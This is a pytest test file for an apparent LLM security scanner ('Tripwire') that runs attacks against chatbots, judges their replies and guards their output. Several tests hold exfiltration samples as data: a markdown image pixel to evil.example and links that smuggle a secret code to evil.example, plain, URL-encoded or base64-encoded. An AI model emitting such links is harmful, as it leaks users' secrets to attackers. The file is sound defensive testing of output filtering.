"""Reliability, snapshot validation, own credentials and demo flows without API calls."""
import json
import base64
from urllib.parse import quote
from dataclasses import replace
import pytest
from streamlit.testing.v1 import AppTest
from core import llm, scanner, config, scan_cache
from core.attacks import load_attacks
from core.judge import judge_batch, judge_benign_batch
from core.output_guard import check
from core.presets import load_presets
from core.scan_archive import encode, decode, load_demo
from core.scan_planning import choose, estimate
from core.scoring import security_score, summarize


def verdict(id=None):
    value = {"verdict": "resisted", "reason": "Safe", "confidence": .9, "violated_rule": None}
    return {**value, **({"id": id} if id else {})}


def test_batch_missing_id_only_rejudges_that_id(monkeypatch):
    monkeypatch.setenv("TRIPWIRE_DOUBLE_JUDGE", "0")
    calls = []
    def chat(messages, **kw):
        calls.append(messages)
        return json.dumps({"verdicts": [verdict("A1")]}) if "Batch mode:" in messages[0]["content"] else json.dumps(verdict())
    monkeypatch.setattr(llm, "chat", chat)
    result = judge_batch(["Protect data"], [{"id": "A1", "attack": "One", "response": "No"}, {"id": "A2", "attack": "Two", "response": "No"}])
    assert set(result) == {"A1", "A2"}
    assert len(calls) == 2
    assert "Two" in calls[1][1]["content"] and "One" not in calls[1][1]["content"]


def test_double_batch_is_two_calls_not_two_per_pair(monkeypatch):
    calls = []
    def chat(messages, **kw):
        body = json.loads(messages[1]["content"])
        calls.append(body)
        return json.dumps({"verdicts": [verdict(p["id"]) for p in body["pairs"]]})
    monkeypatch.setattr(llm, "chat", chat)
    pairs = [{"id": str(i), "attack": "Test", "response": "No"} for i in range(6)]
    result = judge_batch(["First", "Second"], pairs)
    assert len(calls) == 2 and len(result) == 6
    assert calls[1]["rules"] == ["Second", "First"]


def test_benign_questions_are_one_batch(monkeypatch):
    calls = []
    def chat(messages, **kw):
        pairs = json.loads(messages[1]["content"])["pairs"]
        calls.append(1)
        return json.dumps({"verdicts": [{"id": p["id"], "answered": True, "reason": "Helpful"} for p in pairs]})
    monkeypatch.setattr(llm, "chat", chat)
    rows = judge_benign_batch(["Help"], [{"id": str(i), "question": "Hours?", "response": "7am"} for i in range(5)])
    assert len(rows) == 5 and len(calls) == 1


def test_quick_selection_and_call_estimate():
    quick = choose(load_attacks())
    assert len(quick) == 12 and len(choose(load_attacks(), full=True)) == 30
    assert all(sum(a["category"] == c for a in quick) == 2 for c in {r["category"] for r in quick})
    assert estimate(12, 5, config.get_settings())["calls"] == 22
    assert security_score([{"verdict": "not_tested"}, {"verdict": "compromised"}]) == 0
    assert security_score([{"verdict": "not_tested"}]) is None


def test_cache_is_safe_reusable_and_invalidated(monkeypatch, tmp_path):
    monkeypatch.setenv("TRIPWIRE_CACHE", "1")
    monkeypatch.setattr(scan_cache, "CACHE_DIR", tmp_path / "scans")
    calls = []
    def target(prompt, user):
        calls.append(1)
        return prompt.split("Internal reference code: ")[1].split(".")[0]
    monkeypatch.setattr(scanner, "ask_target", target)
    args = ("Private original prompt", ["Protect codes"], "TEST-PRIVATE", load_attacks()[:1], [], False, .5, "baseline")
    first, second = scanner.run_scan(*args), scanner.run_scan(*args)
    assert len(calls) == 1 and second.attack_rows[0]["cached"]
    assert summarize(first)["security_score"] == summarize(second)["security_score"] == 0
    stored = "".join(p.read_text() for p in scan_cache.CACHE_DIR.glob("*.json"))
    assert "Private original prompt" not in stored and "TRIPWIRE-" not in stored and "TEST-PRIVATE" not in stored
    scanner.run_scan(*args, knowledge_text="New document")
    assert len(calls) == 2
    assert scan_cache.clear() == 2


def test_resume_retries_only_not_tested_rows(monkeypatch):
    calls = []
    attacks = load_attacks()[:3]
    def target(prompt, user):
        calls.append(user)
        if user == attacks[1]["prompt"] and calls.count(user) == 1:
            raise RuntimeError("temporary failure")
        return "No disclosure"
    monkeypatch.setattr(scanner, "ask_target", target)
    monkeypatch.setattr(scanner, "judge_batch", lambda rules, pairs: {p["id"]: verdict() for p in pairs})
    baseline = scanner.run_scan("Bot", ["Protect data"], None, attacks, [], False, .5, "baseline")
    assert baseline.attack_rows[1]["verdict"] == "not_tested"
    assert baseline.attack_rows[0]["verdict"] == "resisted"
    resumed = scanner.resume_scan(baseline, {"rules": ["Protect data"], "secret": None, "attacks": attacks, "benign": []})
    assert len(calls) == 4 and calls[-1] == attacks[1]["prompt"]
    assert resumed.attack_rows[0] == baseline.attack_rows[0]
    assert all(r["verdict"] == "resisted" for r in resumed.attack_rows)


def test_link_guard_marks_llm05_and_skips_judges(monkeypatch):
    monkeypatch.setattr(scanner, "ask_target", lambda *a: "![pixel](https://evil.example/pixel)")
    monkeypatch.setattr(scanner, "judge_batch", lambda *a: pytest.fail("Intercepted output reached judge"))
    result = scanner.run_scan("Bot", ["Protect data"], None, load_attacks()[:1], [], False, .5,
                              "hardened_prompt_firewall_guard", use_output_guard=True)
    assert result.attack_rows[0]["verdict"] == "blocked_output"
    assert "LLM05" in result.attack_rows[0]["owasp"]


@pytest.mark.parametrize("url", ["https://evil.example/?code=STAFF50", "https://evil.example/?code=" + quote("MY SECRET/42", safe=""),
    "https://evil.example/?code=" + base64.b64encode(b"MY SECRET/42").decode()])
def test_output_guard_link_exfiltration(url):
    assert check(f"[Support]({url})", "TRIPWIRE-1234ABCD", "MY SECRET/42")["blocked"]


def test_image_domain_allowlist_and_secret_on_trusted_domain(monkeypatch):
    assert check("![pixel](https://evil.example/pixel)", "", None)["blocked"]
    monkeypatch.setenv("TRIPWIRE_OUTPUT_ALLOWED_DOMAINS", '["trusted.example"]')
    assert not check("![photo](https://trusted.example/photo)", "", None)["blocked"]
    assert check("![photo](https://trusted.example/photo?code=TRIPWIRE-1234ABCD)", "TRIPWIRE-1234ABCD", None)["blocked"]


def test_archive_round_trip_redacts_keys_and_rejects_bad_schema():
    runs, context = load_demo()
    run = replace(runs[0], system_prompt="Protect MYSECRET and API-PLACEHOLDER")
    raw = encode(run, context, redactions=["MYSECRET", "API-PLACEHOLDER"])
    assert "MYSECRET" not in raw and "API-PLACEHOLDER" not in raw
    imported, _, _ = decode(raw)
    assert imported.provenance == "imported"
    bad = json.loads(raw)
    bad["scan"]["attack_rows"][0]["verdict"] = "safe-for-sure"
    with pytest.raises(ValueError):
        decode(json.dumps(bad))
    with pytest.raises(ValueError):
        decode("x" * 2_000_001)


def test_demo_exploration_works_without_key_or_llm(monkeypatch):
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    app = AppTest.from_file(str(config.ROOT / "app.py")).run(timeout=30)
    app.switch_page("pages/6_Results.py").run(timeout=30)
    next(b for b in app.button if b.label == "Load demo results").click().run(timeout=30)
    assert not app.exception
    assert app.session_state["baseline"].provenance == "recorded_demo"
    assert app.session_state["scans_used"] == 0
    assert all(s.api_calls == 0 for s in app.session_state["comparison"]["runs"])
    page = str(next((config.ROOT / "pages").glob("2_*")).relative_to(config.ROOT)).replace("\\", "/")
    app.switch_page(page).run(timeout=30)
    assert not app.exception
    assert app.session_state["scans_used"] == 0


def test_own_key_is_session_only_and_reaches_workers(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "SERVER-PLACEHOLDER")
    seen = []
    monkeypatch.setattr(scanner, "ask_target", lambda *a: seen.append(config.get_settings().api_key) or "No disclosure")
    monkeypatch.setattr(scanner, "judge_batch", lambda rules, pairs: {p["id"]: verdict() for p in pairs})
    monkeypatch.setattr(scanner, "judge_benign_batch", lambda rules, pairs: {p["id"]: {"answered": True, "reason": "Helpful"} for p in pairs})
    app = AppTest.from_file(str(config.ROOT / "app.py")).run(timeout=30)
    app.session_state["session_api_key"] = "OWN-PLACEHOLDER"
    page = str(next((config.ROOT / "pages").glob("1_*")).relative_to(config.ROOT)).replace("\\", "/")
    app.switch_page(page).run(timeout=30)
    next(b for b in app.button if b.label == "Run baseline scan").click().run(timeout=30)
    assert not app.exception and set(seen) == {"OWN-PLACEHOLDER"}
    assert config.runtime_settings.get() is None
    assert "OWN-PLACEHOLDER" not in encode(app.session_state["baseline"], app.session_state["scan_context"])


def test_custom_example_and_suggestions(monkeypatch):
    from core.mock_llm import scripted_chat
    monkeypatch.setenv("TRIPWIRE_MOCK", "1")
    monkeypatch.setattr(llm, "chat", lambda messages, **kw: scripted_chat(messages, json_mode=kw.get("json_mode", False)))
    app = AppTest.from_file(str(config.ROOT / "app.py")).run(timeout=30)
    page = str(next((config.ROOT / "pages").glob("1_*")).relative_to(config.ROOT)).replace("\\", "/")
    app.switch_page(page).run(timeout=30)
    next(r for r in app.radio if r.label == "Bot source").set_value("Paste my own system prompt").run(timeout=30)
    assert next(b for b in app.button if b.label == "Run baseline scan").disabled
    next(b for b in app.button if b.label == "Fill with example").click().run(timeout=30)
    assert app.session_state["custom_prompt"] and len(app.session_state["custom_questions"].splitlines()) == 5
    next(b for b in app.button if b.label == "Suggest rules & questions").click().run(timeout=30)
    assert not app.exception
    assert 1 <= len(app.session_state["custom_rules"].splitlines()) <= 5
    assert "STAFF50" not in app.session_state["custom_questions"]


def test_zero_completed_scan_has_recovery_message_and_resumes(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "test-placeholder")
    def fail(*a):
        raise RuntimeError("temporary failure")
    monkeypatch.setattr(scanner, "ask_target", fail)
    app = AppTest.from_file(str(config.ROOT / "app.py")).run(timeout=30)
    page = str(next((config.ROOT / "pages").glob("1_*")).relative_to(config.ROOT)).replace("\\", "/")
    app.switch_page(page).run(timeout=30)
    next(b for b in app.button if b.label == "Run baseline scan").click().run(timeout=30)
    assert not app.exception
    assert all(r["verdict"] == "not_tested" for r in app.session_state["baseline"].attack_rows)
    assert any("No scored attacks" in item.value for item in app.warning)
    assert not any("N/A" in item.value for item in app.markdown)
    monkeypatch.setattr(scanner, "ask_target", lambda *a: "No disclosure")
    monkeypatch.setattr(scanner, "judge_batch", lambda rules, pairs: {p["id"]: verdict() for p in pairs})
    monkeypatch.setattr(scanner, "judge_benign_batch", lambda rules, pairs: {p["id"]: {"answered": True, "reason": "Helpful"} for p in pairs})
    app.switch_page("pages/6_Results.py").run(timeout=30)
    next(b for b in app.button if "not tested" in b.label and "Resume" in b.label).click().run(timeout=30)
    assert not app.exception
    assert app.session_state["scans_used"] == 2
    assert summarize(app.session_state["baseline"])["security_score"] == 100
